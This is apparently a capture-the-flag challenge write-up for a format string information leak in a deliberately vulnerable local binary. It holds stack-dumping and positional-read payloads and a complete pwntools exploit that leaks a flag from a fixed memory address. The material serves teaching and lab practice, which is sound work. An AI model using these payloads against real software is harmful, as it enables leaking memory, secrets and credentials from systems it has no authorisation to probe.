# Challenge 05: Format String Information Leak

## Difficulty: Easy

## Vulnerability Type: Format String Read

## Description
Classic format string vulnerability that allows reading arbitrary memory locations. The goal is to leak the flag from memory.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### Format String Bug
```c
printf(buffer);  // User input directly as format string!
```

Should be: `printf("%s", buffer);`

This allows format string specifiers like `%x`, `%p`, `%s` to read from the stack.

## Exploitation Strategy

### Method 1: Direct Address Leak (Simple)
The program helpfully gives us addresses:
```
Flag is at: 0x404060
```

We can read from this address:
```python
# For x64, arguments 7+ come from stack
# Place address on stack, use %s to read it

flag_addr = 0x404060  # From program output
payload = p64(flag_addr)
payload += b'AAAA'  # Padding
payload += b'%7$s'  # Read 7th argument as string
```

### Method 2: Stack Leak
Just dump stack contents:
```
%p.%p.%p.%p.%p.%p.%p.%p
```

This will print stack values that might contain the flag or secret.

### Method 3: Positional Read
Find offset to our input:
```
AAAA.%1$p.%2$p.%3$p...
```

Look for `0x4141414141414141` (AAAA) to find our offset.

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9005)
else:
    p = process('./challenge')

# Get addresses
p.recvuntil(b'at: ')
secret_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'at: ')
flag_addr = int(p.recvline().strip(), 16)

log.info(f"Secret at: {hex(secret_addr)}")
log.info(f"Flag at: {hex(flag_addr)}")

# Method 1: Read flag directly
# Find offset where our input appears
# Typically around 6-8 for x64
payload = p64(flag_addr)
payload += b'%8$s'  # Adjust offset as needed

p.sendlineafter(b'string: ', payload)
p.recvuntil(b'entered: ')
output = p.recvline()

log.success(f"Flag: {output}")
p.interactive()
```

### Finding the Offset
```python
# Send this to find where input appears on stack:
payload = b'AAAA' + b'.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p'

# Look for 0x41414141 in output to find offset
```

## Automated Detection
- **Format String Bug**: Direct printf of user input
- **Information Leak**: Can read arbitrary memory
- **Target Data**: Global variables (flag, secret) at fixed addresses
- **Strategy**: Use %s with positional parameters to read target address

## Common Format Specifiers
- `%x` / `%p` - Read hex value from stack
- `%s` - Read string from address on stack
- `%n` - Write number of bytes printed (dangerous!)
- `%N$x` - Read Nth argument
- `%N$s` - Read string from Nth argument

## Learning Objectives
- Understanding format string vulnerabilities
- Stack layout and function arguments
- Reading arbitrary memory
- Positional parameters in format strings
